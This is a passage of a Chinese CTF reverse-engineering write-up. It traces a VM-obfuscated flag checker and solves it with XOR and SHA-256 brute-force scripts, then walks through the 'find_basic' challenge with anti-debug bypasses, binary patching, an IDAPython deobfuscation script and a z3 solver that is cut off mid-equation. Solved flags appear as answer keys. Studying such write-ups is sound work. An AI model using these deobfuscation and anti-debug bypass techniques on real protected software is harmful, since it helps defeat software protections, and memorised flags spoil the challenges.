803425cc40800019c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x19--------------------[0290] :: array [0xd008040cc250480, 0xc3, 0x0][0293] :: mov s3, &amp;r290.r_address[0294] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0295] :: add r290.r_address, s3, 0[0296] :: mov r290.r_address, s2[0297] :: mov s2, &amp;s4[0299] :: mov(1) arr[1], s2[0300] :: mov s2, &amp;flag[14][0301] :: mov s4, s2[0302] :: exec r302.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0311] :: array [0xe008040cc250480, 0xc3, 0x0][0314] :: mov s3, &amp;r311.r_address[0315] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0316] :: add r311.r_address, s3, 0[0317] :: mov r311.r_address, s2[0318] :: mov s2, &amp;s4[0320] :: mov(1) arr[1], s2[0321] :: mov s2, &amp;flag[15][0322] :: mov s4, s2[0323] :: exec r323.r_address &lt;- 803425cc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x2c--------------------[0332] :: array [0xf008040cc250480, 0xc3, 0x0][0335] :: mov s3, &amp;r332.r_address[0336] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0337] :: add r332.r_address, s3, 0[0338] :: mov r332.r_address, s2[0339] :: mov s2, &amp;s4[0341] :: mov(1) arr[1], s2[0342] :: mov s2, &amp;flag[16][0343] :: mov s4, s2[0344] :: exec r344.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0353] :: array [0x10008040cc250480, 0xc3, 0x0][0356] :: mov s3, &amp;r353.r_address[0357] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0358] :: add r353.r_address, s3, 0[0359] :: mov r353.r_address, s2[0360] :: mov s2, &amp;s4[0362] :: mov(1) arr[2], s2[0363] :: mov s2, &amp;flag[17][0364] :: mov s4, s2[0365] :: exec r365.r_address &lt;- 803425cc4080001ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1e--------------------[0374] :: array [0x11008040cc250480, 0xc3, 0x0][0377] :: mov s3, &amp;r374.r_address[0378] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0379] :: add r374.r_address, s3, 0[0380] :: mov r374.r_address, s2[0381] :: mov s2, &amp;s4[0383] :: mov(1) arr[2], s2[0384] :: mov s2, &amp;flag[18][0385] :: mov s4, s2[0386] :: exec r386.r_address &lt;- 803425cc4080001fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1f--------------------[0395] :: array [0x12008040cc250480, 0xc3, 0x0][0398] :: mov s3, &amp;r395.r_address[0399] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0400] :: add r395.r_address, s3, 0[0401] :: mov r395.r_address, s2[0402] :: mov s2, &amp;s4[0404] :: mov(1) arr[2], s2[0405] :: mov s2, &amp;flag[19][0406] :: mov s4, s2[0407] :: exec r407.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0416] :: array [0x13008040cc250480, 0xc3, 0x0][0419] :: mov s3, &amp;r416.r_address[0420] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0421] :: add r416.r_address, s3, 0[0422] :: mov r416.r_address, s2[0423] :: mov s2, &amp;s4[0425] :: mov(1) arr[2], s2[0426] :: mov s2, &amp;flag[20][0427] :: mov s4, s2[0428] :: exec r428.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0437] :: array [0x14008040cc250480, 0xc3, 0x0][0440] :: mov s3, &amp;r437.r_address[0441] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0442] :: add r437.r_address, s3, 0[0443] :: mov r437.r_address, s2[0444] :: mov s2, &amp;s4[0446] :: mov(1) arr[2], s2[0447] :: mov s2, &amp;flag[21][0448] :: mov s4, s2[0449] :: exec r449.r_address &lt;- 803425cc40800021c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x21--------------------[0458] :: array [0x15008040cc250480, 0xc3, 0x0][0461] :: mov s3, &amp;r458.r_address[0462] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0463] :: add r458.r_address, s3, 0[0464] :: mov r458.r_address, s2[0465] :: mov s2, &amp;s4[0467] :: mov(1) arr[2], s2[0468] :: mov s2, &amp;flag[22][0469] :: mov s4, s2[0470] :: exec r470.r_address &lt;- 803425cc40800023c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x23--------------------[0479] :: array [0x16008040cc250480, 0xc3, 0x0][0482] :: mov s3, &amp;r479.r_address[0483] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0484] :: add r479.r_address, s3, 0[0485] :: mov r479.r_address, s2[0486] :: mov s2, &amp;s4[0488] :: mov(1) arr[2], s2[0489] :: mov s2, &amp;flag[23][0490] :: mov s4, s2[0491] :: exec r491.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0500] :: array [0x17008040cc250480, 0xc3, 0x0][0503] :: mov s3, &amp;r500.r_address[0504] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0505] :: add r500.r_address, s3, 0[0506] :: mov r500.r_address, s2[0507] :: mov s2, &amp;s4[0509] :: mov(1) arr[2], s2[0510] :: mov s2, &amp;flag[24][0511] :: mov s4, s2[0512] :: exec r512.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0521] :: array [0x18008040cc250480, 0xc3, 0x0][0524] :: mov s3, &amp;r521.r_address[0525] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0526] :: add r521.r_address, s3, 0[0527] :: mov r521.r_address, s2[0528] :: mov s2, &amp;s4[0530] :: mov(1) arr[3], s2[0531] :: mov s2, &amp;flag[25][0532] :: mov s4, s2[0533] :: exec r533.r_address &lt;- 803425cc40800025c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x25--------------------[0542] :: array [0x19008040cc250480, 0xc3, 0x0][0545] :: mov s3, &amp;r542.r_address[0546] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0547] :: add r542.r_address, s3, 0[0548] :: mov r542.r_address, s2[0549] :: mov s2, &amp;s4[0551] :: mov(1) arr[3], s2[0552] :: mov s2, &amp;flag[26][0553] :: mov s4, s2[0554] :: exec r554.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0563] :: array [0x1a008040cc250480, 0xc3, 0x0][0566] :: mov s3, &amp;r563.r_address[0567] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0568] :: add r563.r_address, s3, 0[0569] :: mov r563.r_address, s2[0570] :: mov s2, &amp;s4[0572] :: mov(1) arr[3], s2[0573] :: mov s2, &amp;flag[27][0574] :: mov s4, s2[0575] :: exec r575.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0584] :: array [0x1b008040cc250480, 0xc3, 0x0][0587] :: mov s3, &amp;r584.r_address[0588] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0589] :: add r584.r_address, s3, 0[0590] :: mov r584.r_address, s2[0591] :: mov s2, &amp;s4[0593] :: mov(1) arr[3], s2[0594] :: mov s4, &amp;0[0595] :: mov fail(), &amp;0[0596] :: mov s5, &amp;0[0597] :: mov s2, &amp;arr[0][0599] :: mov s6, s2[0600] :: exec r600.r_address &lt;- 803425fc40800070c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x70--------------------[0609] :: mov s2, &amp;s6[0611] :: add s5, s5, s2[0614] :: mov s6, &amp;0[0615] :: mov s2, &amp;arr[0][0616] :: mov s6, s2[0617] :: exec r617.r_address &lt;- 803425fc4080007cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7c--------------------[0626] :: mov s2, &amp;s6[0628] :: add s5, s5, s2[0631] :: mov s6, &amp;0[0632] :: mov s2, &amp;arr[0][0633] :: mov s6, s2[0634] :: exec r634.r_address &lt;- 803425fc40800073c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x73--------------------[0643] :: mov s2, &amp;s6[0645] :: add s5, s5, s2[0648] :: mov s6, &amp;0[0649] :: mov s2, &amp;arr[0][0650] :: mov s6, s2[0651] :: exec r651.r_address &lt;- 803425fc40800078c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x78--------------------[0660] :: mov s2, &amp;s6[0662] :: add s5, s5, s2[0665] :: mov s6, &amp;0[0666] :: mov s2, &amp;arr[0][0667] :: mov s6, s2[0668] :: exec r668.r_address &lt;- 803425fc4080006fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x6f--------------------[0677] :: mov s2, &amp;s6[0679] :: add s5, s5, s2[0682] :: mov s6, &amp;0[0683] :: mov s2, &amp;arr[0][0684] :: mov s6, s2[0685] :: exec r685.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0694] :: mov s2, &amp;s6[0696] :: add s5, s5, s2[0699] :: mov s6, &amp;0[0700] :: mov s2, &amp;arr[0][0701] :: mov s6, s2[0702] :: exec r702.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0711] :: mov s2, &amp;s6[0713] :: add s5, s5, s2[0716] :: mov s6, &amp;0[0717] :: mov s2, &amp;arr[0][0718] :: mov s6, s2[0719] :: exec r719.r_address &lt;- 803425fc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2c--------------------[0728] :: mov s2, &amp;s6[0730] :: add s5, s5, s2[0733] :: mov s6, &amp;0[0734] :: mov s2, &amp;arr[1][0735] :: mov s6, s2[0736] :: exec r736.r_address &lt;- 803425fc4080007fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7f--------------------[0745] :: mov s2, &amp;s6[0747] :: add s5, s5, s2[0750] :: mov s6, &amp;0[0751] :: mov s2, &amp;arr[1][0752] :: mov s6, s2[0753] :: exec r753.r_address &lt;- 803425fc40800035c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x35--------------------[0762] :: mov s2, &amp;s6[0764] :: add s5, s5, s2[0767] :: mov s6, &amp;0[0768] :: mov s2, &amp;arr[1][0769] :: mov s6, s2[0770] :: exec r770.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0779] :: mov s2, &amp;s6[0781] :: add s5, s5, s2[0784] :: mov s6, &amp;0[0785] :: mov s2, &amp;arr[1][0786] :: mov s6, s2[0787] :: exec r787.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[0796] :: mov s2, &amp;s6[0798] :: add s5, s5, s2[0801] :: mov s6, &amp;0[0802] :: mov s2, &amp;arr[1][0803] :: mov s6, s2[0804] :: exec r804.r_address &lt;- 803425fc40800037c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x37--------------------[0813] :: mov s2, &amp;s6[0815] :: add s5, s5, s2[0818] :: mov s6, &amp;0[0819] :: mov s2, &amp;arr[1][0820] :: mov s6, s2[0821] :: exec r821.r_address &lt;- 803425fc4080003bc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3b--------------------[0830] :: mov s2, &amp;s6[0832] :: add s5, s5, s2[0835] :: mov s6, &amp;0[0836] :: mov s2, &amp;arr[1][0837] :: mov s6, s2[0838] :: exec r838.r_address &lt;- 803425fc40800022c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x22--------------------[0847] :: mov s2, &amp;s6[0849] :: add s5, s5, s2[0852] :: mov s6, &amp;0[0853] :: mov s2, &amp;arr[1][0854] :: mov s6, s2[0855] :: exec r855.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0864] :: mov s2, &amp;s6[0866] :: add s5, s5, s2[0869] :: mov s6, &amp;0[0870] :: mov s2, &amp;arr[2][0871] :: mov s6, s2[0872] :: exec r872.r_address &lt;- 803425fc40800053c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x53--------------------[0881] :: mov s2, &amp;s6[0883] :: add s5, s5, s2[0886] :: mov s6, &amp;0[0887] :: mov s2, &amp;arr[2][0888] :: mov s6, s2[0889] :: exec r889.r_address &lt;- 803425fc4080008ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x8e--------------------[0898] :: mov s2, &amp;s6[0900] :: add s5, s5, s2[0903] :: mov s6, &amp;0[0904] :: mov s2, &amp;arr[2][0905] :: mov s6, s2[0906] :: exec r906.r_address &lt;- 803425fc4080003dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3d--------------------[0915] :: mov s2, &amp;s6[0917] :: add s5, s5, s2[0920] :: mov s6, &amp;0[0921] :: mov s2, &amp;arr[2][0922] :: mov s6, s2[0923] :: exec r923.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0932] :: mov s2, &amp;s6[0934] :: add s5, s5, s2[0937] :: mov s6, &amp;0[0938] :: mov s2, &amp;arr[2][0939] :: mov s6, s2[0940] :: exec r940.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0949] :: mov s2, &amp;s6[0951] :: add s5, s5, s2[0954] :: mov s6, &amp;0[0955] :: mov s2, &amp;arr[2][0956] :: mov s6, s2[0957] :: exec r957.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0966] :: mov s2, &amp;s6[0968] :: add s5, s5, s2[0971] :: mov s6, &amp;0[0972] :: mov s2, &amp;arr[2][0973] :: mov s6, s2[0974] :: exec r974.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0983] :: mov s2, &amp;s6[0985] :: add s5, s5, s2[0988] :: mov s6, &amp;0[0989] :: mov s2, &amp;arr[2][0990] :: mov s6, s2[0991] :: exec r991.r_address &lt;- 803425fc40800029c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x29--------------------[1000] :: mov s2, &amp;s6[1002] :: add s5, s5, s2[1005] :: mov s6, &amp;0[1006] :: mov s2, &amp;arr[3][1007] :: mov s6, s2[1008] :: exec r1008.r_address &lt;- 803425fc40800034c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x34--------------------[1017] :: mov s2, &amp;s6[1019] :: add s5, s5, s2[1022] :: mov s6, &amp;0[1023] :: mov s2, &amp;arr[3][1024] :: mov s6, s2[1025] :: exec r1025.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[1034] :: mov s2, &amp;s6[1036] :: add s5, s5, s2[1039] :: mov s6, &amp;0[1040] :: mov s2, &amp;arr[3][1041] :: mov s6, s2[1042] :: exec r1042.r_address &lt;- 803425fc40800061c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x61--------------------[1051] :: mov s2, &amp;s6[1053] :: add s5, s5, s2[1056] :: mov s6, &amp;0[1057] :: mov s2, &amp;arr[3][1058] :: mov s6, s2[1059] :: exec r1059.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[1068] :: mov s2, &amp;s6[1070] :: add s5, s5, s2[1073] :: mov s6, &amp;0[1074] :: mov s2, &amp;flag[28][1075] :: mov s6, s2[1076] :: mov s2, &amp;flag[29][1077] :: mov s7, s2[1078] :: mov s8, &amp;0[1079] :: mov s2, &amp;s8[1080] :: add s8, s8, s2[1083] :: mov s2, &amp;s6[1084] :: add s8, s8, s2[1087] :: mov s9, &amp;0[1088] :: mov s2, &amp;s9[1089] :: add s9, s9, s2[1092] :: mov s2, &amp;s7[1093] :: add s9, s9, s2[1096] :: mov s2, &amp;s9[1097] :: add s10, s8, s2[1100] :: exec r1100.r_address &lt;- 8034255c4180006cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0x6c--------------------[1109] :: mov s2, &amp;s10[1111] :: add s5, s5, s2[1114] :: mov s6, &amp;0[1115] :: mov s7, &amp;0[1116] :: mov s8, &amp;0[1117] :: mov s9, &amp;0[1118] :: mov s10, &amp;0[1119] :: mov s2, &amp;flag[28][1120] :: mov s6, s2[1121] :: mov s2, &amp;flag[29][1122] :: mov s7, s2[1123] :: mov s8, &amp;0[1124] :: mov s2, &amp;s8[1125] :: add s8, s8, s2[1128] :: mov s2, &amp;s6[1129] :: add s8, s8, s2[1132] :: mov s2, &amp;s8[1133] :: add s8, s8, s2[1136] :: mov s9, &amp;0[1137] :: mov s2, &amp;s9[1138] :: add s9, s9, s2[1141] :: mov s2, &amp;s7[1142] :: add s9, s9, s2[1145] :: mov s2, &amp;s9[1146] :: add s10, s8, s2[1149] :: exec r1149.r_address &lt;- 8034255c418000a1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xa1--------------------[1158] :: mov s2, &amp;s10[1160] :: add s5, s5, s2[1163] :: mov s6, &amp;0[1164] :: mov s7, &amp;0[1165] :: mov s8, &amp;0[1166] :: mov s9, &amp;0[1167] :: mov s10, &amp;0[1168] :: mov s2, &amp;flag[30][1169] :: mov s6, s2[1170] :: mov s2, &amp;flag[31][1171] :: mov s7, s2[1172] :: mov s8, &amp;0[1173] :: mov s2, &amp;s8[1174] :: add s8, s8, s2[1177] :: mov s2, &amp;s6[1178] :: add s8, s8, s2[1181] :: mov s9, &amp;0[1182] :: mov s2, &amp;s9[1183] :: add s9, s9, s2[1186] :: mov s2, &amp;s7[1187] :: add s9, s9, s2[1190] :: mov s2, &amp;s9[1191] :: add s10, s8, s2[1194] :: exec r1194.r_address &lt;- 8034255c418000b1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xb1--------------------[1203] :: mov s2, &amp;s10[1205] :: add s5, s5, s2[1208] :: mov s6, &amp;0[1209] :: mov s7, &amp;0[1210] :: mov s8, &amp;0[1211] :: mov s9, &amp;0[1212] :: mov s10, &amp;0[1213] :: mov s2, &amp;flag[30][1214] :: mov s6, s2[1215] :: mov s2, &amp;flag[31][1216] :: mov s7, s2[1217] :: mov s8, &amp;0[1218] :: mov s2, &amp;s8[1219] :: add s8, s8, s2[1222] :: mov s2, &amp;s6[1223] :: add s8, s8, s2[1226] :: mov s2, &amp;s8[1227] :: add s8, s8, s2[1230] :: mov s9, &amp;0[1231] :: mov s2, &amp;s9[1232] :: add s9, s9, s2[1235] :: mov s2, &amp;s7[1236] :: add s9, s9, s2[1239] :: mov s2, &amp;s9[1240] :: add s10, s8, s2[1243] :: exec r1243.r_address &lt;- 8034255c418000e5c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xe5--------------------[1252] :: mov s2, &amp;s10[1254] :: add s5, s5, s2[1257] :: mov s6, &amp;0[1258] :: mov s7, &amp;0[1259] :: mov s8, &amp;0[1260] :: mov s9, &amp;0[1261] :: mov s10, &amp;0[1262] :: mov s2, &amp;s5[1264] :: mov(1) fail(), 大致思路是对输入异或然后+i对比数据 但是flag数组前四个没直接给出，有四个大数字以第一个为例1585408084625667200 转为16进制16008040cc253480 倒叙一下就是 803425cc40800016，再根据后面的数据类推，flag[0]就是0x16 123456789101112131415import hashlibxor=[0x16,0x17,0x10,0x12,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x24,0x2c,0x26,0x1e,0x1f,0x20,0x20,0x21,0x23,0x27,0x24,0x25,0x26,0x27]encflag=[0x70,0x7c,0x73,0x78,0x6f,0x27,0x2a,0x2c,0x7f,0x35,0x2d,0x32,0x37,0x3b,0x22,0x59,0x53,0x8e,0x3d,0x2a,0x59,0x27,0x2d,0x29,0x34,0x2d,0x61,0x32]a=&quot;&quot;for i in range(len(encflag)): a+=chr((encflag[i]-i)^xor[i])l = &quot;1234567890abcdef&quot;for b in l: for c in l: for d in l: flag = a+b+c+d+&quot;&#125;&quot; sha = hashlib.sha256(flag.encode(&quot;utf-8&quot;)).hexdigest() if sha[0:16] == &quot;f860464d767610bb&quot;: print(flag) break 最后的flag：flag{366c950370fec47e34581a0574} find_basicIDA 静态分析，可以明显看出程序加过 VM 且每个 handler 自身作为分发器 call进入的后是switch语句，再根据之前的赋值执行相应的操作 大概混肴逻辑是先赋值一个数，这个数决定了下面函数的操作，进入下面的call函数，执行相应的语句 trace记录debugger打开tracing window 在的打开view里面的tracing 然后点亮代码跟踪 但是在调试时候会有如下报错 1F7CF3464: got SIGTRAP signal (Trace trap) (exc.code 5, tid 8259) 正常调试是没用问题的，启用trace之后就会报错，这里设置一下ida调试debugger option 选择最下方edit exceptions 其他类似的报错也可如此，但是究其原理，类似是创造了一个死循环，有师傅懂得的话欢迎评论 参考： 常见反调试整理 (nigoule.com) Linux进程被信号杀死后退出状态码(exit code)的分析_halfclear的博客-CSDN博客_exitcode 例如移除时钟报错，有一种思路就是更换函数 1234移除alarm函数# 将程序名为ProgrammName中的alarm替换为isnan &gt;sed -i s/alarm/isnan/g ./ProgrammName 为了方便查看trace代码，这里还有一个垃圾循环我们可以修改一下 主要逻辑是产生了一个随机数后逻辑与0xFF，不断地比较。如果小于就自增一在继续判断，不断地循环直到和产生的随机数相等再推出循环。经过分析该循环体内没有需要的数据。我们可以直接patch跳转条件 或者在call完rand函数之后下一个不执行但是修改eax值的断点 然后我们就可以下断点trcace我们的代码 接着就可以分析相关的执行数据 例如这里就是我们的数据 以下类推可以得到最终的逻辑 或者我们可以写脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133from idc import *from capstone import *from keystone import *md = Cs(CS_ARCH_X86, CS_MODE_32)ks = Ks(KS_ARCH_X86, KS_MODE_32)def mydis(code, addr=0): for i in md.disasm(code, addr): return (&#x27;%s %s&#x27; %(i.mnemonic, i.op_str))def myasm(dis_txt, addr=0): #keystone fail encoding, count = ks.asm(dis_txt, addr=addr) return bytes(encoding)class Block: def __init__(self, start_ea, end_ea, imm, reg, call_target): self.start_ea = start_ea self.end_ea = end_ea self.imm = imm self.reg = reg self.call_target = call_targetregnums = []def get_block(start_ea): mnem_list = [&#x27;pushf&#x27;, &#x27;pusha&#x27;, &#x27;mov&#x27;, &#x27;call&#x27;, &#x27;pop&#x27;] ea = start_ea i = 0 while i &lt; 5: mnem = idc.print_insn_mnem(ea) if mnem_list[i%5] != mnem: raise 0 if mnem == &#x27;mov&#x27;: imm = idc.get_operand_value(ea, 1) # 17 -&gt; cl, 18 -&gt; dl, 19 -&gt; bl reg = idc.get_operand_value(ea, 0) #reg_id &#x27;&#x27;&#x27; if reg not in regnums: print (&#x27;reg=%s, ea=%x&#x27; %(reg, ea)) regnums.append(reg) &#x27;&#x27;&#x27; if mnem == &#x27;call&#x27;: call_target = idc.get_operand_value(ea, 0) i += 1 ea += idc.get_item_size(ea) return Block(start_ea, ea, imm, reg, call_target)def check_mnem(ea, should_mnem): mnem = idc.print_insn_mnem(ea) if mnem != should_mnem: assert 0def get_real_code(block, new_code, new_code_ea): ea = block.call_target while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;cmp&#x27;: reg = idc.get_operand_value(ea, 0) imm = idc.get_operand_value(ea, 1) if (reg == block.reg) &amp; (imm == block.imm): break ea += idc.get_item_size(ea) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;jnz&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popa&#x27;) ea += idc.get_item_size(ea) check_mnem(ea, &#x27;popf&#x27;) ea += idc.get_item_size(ea) mnem = idc.print_insn_mnem(ea) if mnem == &#x27;pushf&#x27;: print (&#x27;find ret: ea=%x&#x27; %ea) new_code += myasm(&#x27;ret&#x27;, new_code_ea+len(new_code)) return True, new_code while True: mnem = idc.print_insn_mnem(ea) if mnem == &#x27;jmp&#x27;: break dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print (&#x27;block=%x, ea=%x, dis=%s&#x27; %(block.start_ea, ea, dis)) new_code += myasm(dis, new_code_ea+len(new_code)) ea += idc.get_item_size(ea) return False, new_codedef handle_one_fun(fun_start, new_code_ea): ea = fun_start new_code = b&#x27;&#x27; while True: mnem = idc.print_insn_mnem(ea) if mnem != &#x27;pushf&#x27;: dis = mydis(idc.get_bytes(ea, idc.get_item_size(ea)), ea) print(&#x27;ea=%x, dis=%s&#x27; % (ea, dis)) new_code += myasm(dis, new_code_ea + len(new_code)) if mnem == &#x27;retn&#x27;: break ea += idc.get_item_size(ea) else: print (&#x27;get_block ea=%x&#x27; %ea) myblock = get_block(ea) #print (&#x27;ea=%x, new_ea=%x&#x27; %(myblock.start_ea, new_code_ea+len(new_code))) ret, new_code = get_real_code(myblock, new_code, new_code_ea) if ret: break ea = myblock.end_ea return new_codenew_code_start = 0x96150ida_bytes.patch_bytes(new_code_start, b&#x27;\\x90&#x27;*0x10000)for i in range(0x10000): idc.del_items(i+new_code_start)funs = [0x48F4, 0x48c8, 0x3fbf, 0x3F1B, 0x4148, 0x750A9, 0x33EC]new_code_ea = new_code_startfor fun in funs: print (&#x27;--------------------------------&#x27;) print (&#x27;fun=%x, new_fun=%x&#x27; %(fun, new_code_ea)) print (&#x27;--------------------------------&#x27;) new_code = handle_one_fun(fun, new_code_ea) ida_bytes.patch_bytes(new_code_ea, new_code) idc.create_insn(new_code_ea) ida_funcs.add_func(new_code_ea) new_code_ea += len(new_code) 最后z3求解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from z3 import *flag = [BitVec(&#x27;x%d&#x27; % i, 8) for i in range(28)]s = Solver()v5 = 40085 * flag[3]- 222506 * flag[2]+ 54507 * flag[4]+ 88056 * flag[1]+ 212571 * flag[5]- 160722 * flag[0]-0x6A31Ds.add(v5==0)v5 = 49300 * flag[3]+ 259229 * flag[0]+ 278066 * flag[2]- 127937 * flag[1]- 295169 * flag[4]- 8368677s.add(v5==0)v5 = 42214 * flag[1]- 108025 * flag[3]+ 205972 * flag[0]+ 27559 * flag[2]- 17114904s.add(v5==0)v5 = - 151496 * flag[1]+ 204740 * flag[0]+ 80143 * flag[2]- 12295783s.add(v5==0)v5 = 241935 * flag[1]+ 124128 * flag[0]- 38790036+ 273221 * flag[0]- 27868542s.add(v5==0)v6 = -279656 * flag[2]- 199574 * flag[1]- 258130 * flag[8]- 200399 * flag[3]- 173903 * flag[7]+ 175816 * flag[0]- 234569 * flag[6]- 108273 * flag[4]- 222957 * flag[5]+ 128244179s.add(v6==0)v6 = - 81541 * flag[1]- 268763 * flag[0]+ 219073 * flag[3]+ 34782 * flag[6]+ 21153 * flag[5]+ 173005 * flag[7]+ 76285 * flag[4]+ 32825 * flag[2]- 13874925s.add(v6==0)v6 = 85214 * flag[2]- 268299 * flag[3]- 230981 * flag[1]+ 290772 * flag[5]- 74394 * flag[4]+ 28044 * flag[6]- 242995 * flag[0]+ 50871139s.add(v6==0)v7 = -208564 * flag[0] + 81934 * flag[9] - 106641 * flag[7] + 198477 * flag[2] + 154505 * flag[1] + 48440 * flag[5] - 149004 * flag[3] - 108909 * flag[4] - 51714 * flag[10] - 296420 * flag[8] + 263021 * flag[6] + 688726 s.add(v7==0)v7 = - 131130 * flag[2] + 224265 * flag[3] + 230702 * flag[0] - 176285 * flag[7] - 274778 * flag[4] + 103848 * flag[8] - 136039 * flag[9] - 241151 * flag[5] + 15542 * flag[6] - 17521 * flag[1] + 41644083s.add(v7==0)v8 = 195056 * flag[4]- 15717 * flag[9]- 180214 * flag[6]- 114427 * flag[5]+ 277782 * flag[7]+ 261379 * flag[8]- 225266 * flag[2]+ 107609 * flag[0]+ 259792 * flag[3]+ 270563 * flag[11]+ 205124 * flag[1]+ 138334 * flag[10]+ 103474 * flag[12]- 117027475s.add(v8==0)v8 = 189573 * flag[8]+ 64393 * flag[6]+ 231137 * flag[1]+ 145315 * flag[4]- 53938 * flag[10]- 291345 * flag[5]+ 216413 * flag[3]- 204681 * flag[0]- 65519 * flag[9]- 262826 * flag[2]+ 187002 * flag[7]+ 271732 * flag[11]- 38663722s.add(v8==0)v9 = 15645 * flag[13] + 276267 * flag[12] + 31190 * flag[5] - 244002 * flag[2] + 81415 * flag[3] - 22940 * flag[10] - 126076 * flag[7] + 8932 * flag[8] + 112153 * flag[4] + 194218 * flag[11] + 197656 * flag[9] - 204463 * flag[0] - 219500 * flag[1] + 19777 * flag[6] - 24531260s.add(v9==0)v10 = 279969 * flag[8]- 123977 * flag[4]+ 162094 * flag[0]- 215769 * flag[1]- 18878 * flag[14]- 80292 * flag[11]- 237675 * flag[5]- 222121 * flag[6]+ 269381 * flag[12]+ 153934 * flag[13]- 165380 * flag[10]- 157137 * flag[2]- 186748 * flag[3]+ 170756 * 